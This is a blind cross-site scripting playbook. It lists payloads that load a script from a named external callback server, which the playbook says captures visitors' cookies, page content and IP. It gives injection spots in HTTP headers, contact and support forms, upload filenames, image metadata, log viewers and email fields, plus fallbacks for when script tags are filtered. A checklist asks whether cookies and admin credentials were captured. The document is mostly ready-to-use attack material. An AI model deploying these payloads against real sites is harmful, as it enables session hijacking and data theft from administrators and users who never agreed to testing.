# Blind XSS Playbook

## Setup — xss.report Server (user's server)
```
Server: https://xss.report/c/yukthi93
Payload: <script src=https://xss.report/c/yukthi93></script>
```
This is the primary blind XSS server. The payload loads a script from the server, which reports the visit including cookies, page content, and IP.

## Universal Payload (works in most contexts)
```
"><script src=https://xss.report/c/yukthi93></script>
```
Injects in: HTML body, double-quoted attributes, single-quoted attributes, script contexts.

## High-Impact Injection Points

### Level 1: HTTP Headers (Admin Panel Blind XSS)
```http
User-Agent: <script src=https://xss.report/c/yukthi93></script>
Referer: <script src=https://xss.report/c/yukthi93></script>
X-Forwarded-For: <script src=https://xss.report/c/yukthi93></script>
X-Real-IP: <script src=https://xss.report/c/yukthi93></script>
CF-Connecting-IP: <script src=https://xss.report/c/yukthi93></script>
True-Client-IP: <script src=https://xss.report/c/yukthi93></script>
```

### Level 2: Forms (Stored XSS in Admin Views)
- Contact forms → "Your message" → Admin reviews it
- Feedback forms → Agent support dashboard
- Bug report forms → Internal ticketing system
- Registration forms → "Pending approval" list
- Comment forms → Moderation panel

Inject:
```
"><script src=https://xss.report/c/yukthi93></script>
```

### Level 3: File Upload Metadata
- Filename: `"><script src=https://xss.report/c/yukthi93></script>.png`
- Image metadata (EXIF): Use exiftool to inject into Artist, Description, etc.

### Level 4: Log Viewers/SIEM
```
X-Forwarded-For: <script src=https://xss.report/c/yukthi93></script>
User-Agent: "><script src=https://xss.report/c/yukthi93></script>
```

### Level 5: Email Systems
- Email subject → Preview pane XSS
- Sender name → Email client HTML rendering

### Level 6: PDF Generators
- Name fields → Rendered in generated PDF with JS execution

## Payload Selection by Target

### Admin Panels
```
<script src=https://xss.report/c/yukthi93></script>
```
### Log Viewers (header injection)
```
"><script src=https://xss.report/c/yukthi93></script>
```
### Contact Forms (stored)
```
"><script src=https://xss.report/c/yukthi93></script>
```
### Filename-based
```
<script src=https://xss.report/c/yukthi93></script>.png
```
### CSS/Link callback (if script tags filtered)
```
<link rel=stylesheet href=https://xss.report/c/yukthi93>
<style>@import url(https://xss.report/c/yukthi93)</style>
```

## Verification Checklist
```markdown
- [ ] xss.report callback received
- [ ] Cookie/data present in the callback
- [ ] Payload survives sanitization (not truncated/encoded)
- [ ] Can reproduce with clean session
- [ ] Identified exact injection point
- [ ] Identified exact trigger (admin view, log viewer, etc.)
- [ ] Confirmed impact scope (admin credentials? user data?)
```
